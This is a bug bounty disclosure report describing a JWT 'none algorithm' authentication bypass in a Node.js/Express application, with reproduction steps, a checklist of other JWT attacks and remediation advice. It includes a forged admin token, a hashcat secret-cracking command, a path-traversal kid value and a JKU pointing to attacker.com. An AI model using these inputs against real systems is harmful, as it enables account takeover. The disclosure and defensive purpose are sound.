---
title: "JWT Authentication Bypass via None Algorithm"
url: "https://bugcrowd.com/submissions/..."
vuln_class: "JWT"
tech: "Node.js, Express, JSON Web Tokens"
bounty: 2500
date: 2026-06-28
---

## Summary

The JWT library was vulnerable to the "none algorithm" attack. The server accepted tokens with `alg: none` without verifying the signature, allowing arbitrary user impersonation.

## Steps to Reproduce

1. Decode a valid JWT to understand the payload structure
2. Create a new JWT with header `{"alg":"none","typ":"JWT"}` and modified payload
3. Send the token with an empty signature: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.`
4. Access admin endpoints with this token — authentication bypassed

## JWT Attacks Checklist

1. **None algorithm**: Set `alg: none` — server skips verification
2. **Weak secret**: Crack with `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`
3. **Kid injection**: Set `kid` to path traversal — `kid: ../../public/css/main.css`
4. **JKU bypass**: Point JKU to attacker-controlled JWKS: `jku: https://attacker.com/jwks.json`
5. **Algorithm confusion**: Change `RS256` to `HS256` — server uses public key as HMAC secret

## Impact

Full account takeover — impersonate any user including administrators.

## Remediation

- Reject tokens with `alg: none` explicitly
- Pin the expected algorithm (do not derive from token header)
- Use a strong, random HMAC secret (64+ bytes)
- Validate `kid` against an allowlist
